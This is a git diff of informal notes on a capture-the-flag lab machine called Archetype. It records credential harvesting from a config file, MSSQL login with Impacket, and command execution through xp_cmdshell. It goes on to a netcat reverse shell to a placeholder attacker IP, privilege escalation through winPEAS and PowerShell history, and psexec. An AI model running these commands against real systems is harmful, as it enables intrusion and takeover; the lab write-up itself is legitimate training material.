@@ -36,6 +36,7 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Micro>
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
+________________________________________________________________________________________________________________________
 
 ### SMB ### 
 
@@ -58,6 +59,7 @@ Network Distance: 2 hops
 
                                         "Found some credentials in  prod.dtsConfig"  
                                         Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
+________________________________________________________________________________________________________________________
 
 ### Impacket ###
 
@@ -73,6 +75,7 @@ Network Distance: 2 hops
 
 #running                                                                                                                                                                                                      >
             python3 mssqlclient.py -h
+________________________________________________________________________________________________________________________
 
 """ Got a connection! """
 pythonn3 mssqlclient.py ARCHETYPE/sql_svc@10.129.79.20 -windows-auth
@@ -93,6 +96,7 @@ Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its aff
   SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
   -
   1
+________________________________________________________________________________________________________________________
 
 ### "Getting CMD-shell..." ###
 
@@ -109,6 +113,7 @@ Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its aff
 # this is certainly disabled
   SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
   ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A sy>
+________________________________________________________________________________________________________________________
 
 ### Got a shell! ###
   SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
@@ -117,15 +122,18 @@ Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its aff
   archetype\sql_svc
   
   NULL
+________________________________________________________________________________________________________________________
 
 """ MY STUPID ASS DIDN'T PUT THE .exe FILE IN THE PYTHON SO NO MATTER HOW MANY HIT YOU GET THERE IS NO FILE SO HOW ARE YOU GOING TO GET THE SHELL?? """
                                   """MAKE SURE ALL THE THINGS YOU NEED ARE ACCESSIBLE VIA THE VICTIM """
+________________________________________________________________________________________________________________________
 
   ┌──(kali㉿kali)-[/var/www/html]
   └─$ ls
   index.html  index.nginx-debian.html  nc64.exe  winPEASx64.exe
 
 """ MORE STUPIDLY MY FILE DIDN'T GET DOWNLOADED WHILE HITTING THE PYTHON SERVER BECAUSE YOU WEREN'T IN WWW """
+________________________________________________________________________________________________________________________
 
 ### Downloading and executing ###
 
@@ -142,6 +150,7 @@ xp_cmdshell "cmd /c C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe ip 443"
         Microsoft Windows [Version 10.0.17763.2061]
         (c) 2018 Microsoft Corporation. All rights reserved.
         C:\Windows\system32>
+________________________________________________________________________________________________________________________
 
 ### Post Exploitation ###
 
@@ -164,12 +173,14 @@ xp_cmdshell "cmd /c C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe ip 443"
 02/25/2020  07:37 AM                32 user.txt
                1 File(s)             32 bytes
                2 Dir(s)  10,725,150,720 bytes free
+________________________________________________________________________________________________________________________
 
 """ reading the contents """
 
         C:\Users\sql_svc\Desktop>type user.txt
         type user.txt
         3e7b1*****218e****f3f495*****1a3  ( hid the user flag, bruteforce if you have the skill but you don't HAHA)
+________________________________________________________________________________________________________________________
 
 ### winPEAS ###
 "For privilege escalation, we are going to use a tool called winPEAS , which can automate "
@@ -197,6 +208,7 @@ xp_cmdshell "cmd /c C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe ip 443"
             08/18/2025  09:17 AM         1,930,752 winPEASx64.exe
                            2 File(s)      1,930,784 bytes
                            2 Dir(s)  10,721,677,312 bytes free
+________________________________________________________________________________________________________________________
 
 ### Execution ###
 """ executing the winPeasx64 file we downloaded on the victim system: """
@@ -209,6 +221,7 @@ We will read the PowerShell history file, which is the equivalent of bash_histor
 
 `We got in cleartext the password for the Administrator user which is`
  (********_*dm1n!!)
+________________________________________________________________________________________________________________________
 
 ### Shell ###
 """We can now use the tool psexec.py again from the Impacket suite to """ 
@@ -229,6 +242,7 @@ Password:
 Microsoft Windows [Version 10.0.17763.2061]
 (c) 2018 Microsoft Corporation. All rights reserved.
   C:\Windows\system32> 
+________________________________________________________________________________________________________________________
 
 ### Exploitation ###
 
